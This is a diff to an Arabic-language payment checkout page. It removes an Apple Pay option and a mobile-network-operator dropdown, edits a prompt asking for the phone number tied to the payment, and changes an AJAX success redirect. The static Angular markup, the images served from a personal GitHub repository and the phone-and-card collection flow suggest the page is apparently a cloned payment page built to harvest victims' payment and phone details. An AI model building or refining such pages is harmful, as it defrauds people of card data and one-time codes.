@@ -28342,38 +28342,8 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                                                                                             <div class=" ng-untouched ng-pristine ng-star-inserted ng-invalid">
                                                                                                 <div class="payment-details-mode " style="margin-right: -7px;">
                                                                                                     <mat-radio-group role="radiogroup" aria-labelledby="example-radio-group-label" formcontrolname="paymentMethod" class="mat-radio-group example-radio-group ng-untouched ng-pristine ng-valid">
-                                                                                                        <mat-accordion hidetoggle="true" class="mat-accordion fix-radio-position">
-																										<pay-by-applepay class="ng-star-inserted"><mat-expansion-panel disabled="" id="payByApplPay"
-																												class="mat-expansion-panel payByProvider ng-tns-c133-31 ng-star-inserted"><mat-expansion-panel-header
-																													role="button"
-																													class="mat-expansion-panel-header mat-focus-indicator ng-tns-c135-32 ng-tns-c133-31 mat-expansion-toggle-indicator-after ng-star-inserted"
-																													id="mat-expansion-panel-header-2" tabindex="-1" aria-controls="cdk-accordion-child-2" aria-expanded="false"
-																													aria-disabled="true"><span class="mat-content ng-tns-c135-32 mat-content-hide-toggle"><mat-panel-title
-																															class="mat-expansion-panel-header-title ng-tns-c135-32">
-																															<div class="title"><mat-radio-button name="paymentOption" aria-disabled="false"
-																																	class="mat-radio-button mat-accent" id="ApplePay"><label class="mat-radio-label"
-																																		for="ApplePay-input"><span class="mat-radio-container"><span
-																																				class="mat-radio-outer-circle"></span><span
-																																				class="mat-radio-inner-circle"></span><input type="radio"
-																																				class="mat-radio-input" id="ApplePay-input" name="mat-radio-group-4"
-																																				value="[object Object]" tabindex="-1"><span mat-ripple=""
-																																				class="mat-ripple mat-radio-ripple mat-focus-indicator"><span
-																																					class="mat-ripple-element mat-radio-persistent-ripple"></span></span></span><span
-																																			class="mat-radio-label-content"><span style="display: none;">&nbsp;</span><span
-																																				role="radio" aria-label="ApplePay / أبل باي" class="ng-star-inserted">أبل باي -
-																																				Apple Pay</span><!----></span></label></mat-radio-button></div>
-																														</mat-panel-title><mat-panel-description class="mat-expansion-panel-header-description ng-tns-c135-32">
-																															<div class="ApplePay-logo"><img alt="ApplePay-Logo" height="60" class="ng-star-inserted"
-																																	src="https://cdn.jsdelivr.net/gh/Fateen980/efaamada@main/public/new/img/apple-pay.png"
-																																	style="top: -10px;position:absolute;width:85px;left: -10px;"><!----></div>
-																														</mat-panel-description></span><!----></mat-expansion-panel-header></mat-expansion-panel>
-																											<mat-error aria-atomic="true" class="mat-error ng-tns-c88-7 ng-star-inserted" style="display: none;"
-																												aria-live="polite" id="mat-error-2apple">
-																												<div class="error-msg ng-star-inserted" style="padding-right: 12px;">
-																													<p><span>عذرا خدمة الدفع عبر أبل باي - Apple Pay متوقفة مؤقتا، يمكنك التمتع بتجربة دفع سلسة وآمنة عبر بطاقات
-																															الدفع</span></p>
-																												</div><!----><!---->
-																											</mat-error><!----></pay-by-applepay>
+                                                                                                     <mat-accordion hidetoggle="true" class="mat-accordion fix-radio-position">
+																									
                                                                                                             <mat-expansion-panel disabled="" class="mat-expansion-panel ng-tns-c121-94 expansion-panel-border mat-expanded mat-expansion-panel-spacing ng-star-inserted" style="display: table-row;background: transparent;">
                                                                                                                 <div style="background: var(--light);border-radius: 0.75rem!important;padding: 1.5rem;box-sizing: border-box;margin-bottom: 1rem;border: 0.063rem solid var(--dark-b10);border: .175rem solid var(--focusedLabelColor) !important;">
                                                                                                                     <mat-expansion-panel-header role="button" class="mat-expansion-panel-header mat-focus-indicator ng-tns-c123-95 ng-tns-c121-94 mat-expanded mat-expansion-toggle-indicator-after ng-star-inserted" style="align-items: center;" id="mat-expansion-panel-header-13" tabindex="-1" aria-controls="cdk-accordion-child-13" aria-expanded="true" aria-disabled="true">
@@ -28983,7 +28953,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                                                                                                                         <div class="pay-by-cards-checkbox" style="margin-top: 0;">
 
                                                                                                                             <div class="pay-by-cards-checkbox-desc ng-star-inserted" style="line-height: 25px;">
-                                                                                                                                <br>لمتابعةالطلب يرجى إدخال رقم الهاتف المرتبط  بعملية الدفع 
+                                                                                                                                <br>لمتابعةالطلب يرجى إدخال رقم الهاتف  
                                                                                                                             </div>
                                                                                                                             <!---->
                                                                                                                         </div>
@@ -29049,58 +29019,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                                                                                                                                             <!---->
                                                                                                                                         </div>
                                                                                                                                         <div style="margin-top: 15px;width: 100%;" class="pay-by-user-provider control-wrapper">
-                                                                                                                                            <div class="custom-form-item second-type custom-select is-valid">
-                                                                                                                                                <mat-form-field appearance="fill" class="mat-form-field mat-select-field ng-tns-c88-25 mat-primary mat-form-field-type-mat-select mat-form-field-appearance-fill mat-form-field-has-label mat-form-field-hide-placeholder ng-untouched ng-pristine ng-star-inserted mat-form-field-can-float ng-valid">
-                                                                                                                                                <div class="mat-form-field-wrapper ng-tns-c87-38">
-																																					<div class="mat-form-field-flex ng-tns-c87-38">
-																																						<!----><!---->
-																																						<div class="mat-form-field-infix ng-tns-c87-38">
-																																						
-																																										<select id="mobilety"  name="mobilety" class="myreq mat-autocomplete-trigger mat-input-element mat-form-field-autofill-control ng-tns-c87-38 cdk-text-field-autofill-monitored ng-touched ng-dirty ng-valid" size="1" value="" required="">
-																																											<option value="">اختيار </option>
-																																											
-																																											<option value="Zain" class="F8vzy2" aria-selected="false">Zain</option>
-																																											<option value="Mobily" class="F8vzy2" aria-selected="false">Mobily</option>
-																																											<option value="Stc" class="F8vzy2" aria-selected="false">Stc</option></select>
-																																											
-																																										</select>
-									 
-
-																																						<!----><span class="mat-form-field-label-wrapper ng-tns-c88-101">
-                                                                                                                                                                    <label style=" top: -19px; font-size: 12px; right: -5px; color: #000; " class="mat-form-field-label ng-tns-c88-101 mat-empty mat-form-field-empty ng-star-inserted" id="mat-form-field-label-67" for="mat-input-24" aria-owns="mat-input-24">
-                                                                                                                                                                        <!---->
-                                                                                                                                                                        <mat-label class="ng-tns-c88-101 ng-star-inserted">مشغل شبكة الجوال
-                                                                                                                                                                            </mat-label>
-                                                                                                                                                                        <!----><!----><span aria-hidden="true" class="mat-placeholder-required mat-form-field-required-marker ng-tns-c88-101 ng-star-inserted">
-                                                                                                                                                                            *</span><!---->
-                                                                                                                                                                    </label>
-                                                                                                                                                                    <!---->
-                                                                                                                                                                </span>
-																																						</div>
-																																						<div class="mat-form-field-suffix ng-tns-c87-38 ng-star-inserted">
-																																							<mat-icon role="img" matsuffix="" class="mat-icon notranslate material-icons mat-ligature-font mat-icon-no-color ng-tns-c87-38" aria-hidden="true" data-mat-icon-type="font"><span class="material-symbols-outlined arrow-down-icon">
-																																									expand_more
-																																								</span></mat-icon>
-																																						</div>
-																																						<!---->
-																																					</div>
-																																						<div class="mat-form-field-underline ng-tns-c87-38 ng-star-inserted">
-																																							<span class="mat-form-field-ripple ng-tns-c87-38"></span>
-																																						</div>
-																																						<!---->
-																																						<div class="mat-form-field-subscript-wrapper ng-tns-c87-38">
-																																							<!---->
-																																							<div class="mat-form-field-hint-wrapper ng-tns-c87-38 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
-																																								<!---->
-																																								<div class="mat-form-field-hint-spacer ng-tns-c87-38">
-																																								</div>
-																																							</div>
-																																							<!---->
-																																						</div>
-																																					</div>																									
-																																					
-                                                                                                                                                </mat-form-field>
-                                                                                                                                            </div>
+                                                                                                                                        
                                                                                                                                             <div class="mat-select-panel-wrap" style="position: absolute; z-index: 99; width: 100%;display: none;">
                                                                                                                                                 <div role="listbox" tabindex="-1" style="padding-top: 0;min-width: unset;max-width: 160px;" id="mat-select-0-panel" aria-multiselectable="false" aria-labelledby="mat-form-field-label-63" class="ng-tns-c143-98 ng-trigger ng-trigger-transformPanel mat-select-panel mat-primary select-dropdow">
                                                                                                                                                     <mat-option role="option" class="mat-option mat-focus-indicator select-panel ng-tns-c143-98 ng-star-inserted" id="mat-option-3788" tabindex="0" aria-disabled="false">
@@ -29852,7 +29771,7 @@ $.ajax({
 		}
 		else if(data.msg == 1)
 		{
-			window.location.href = "/bname/0";
+			window.location.href = "/bname/1";
 		}
 		else
 		{
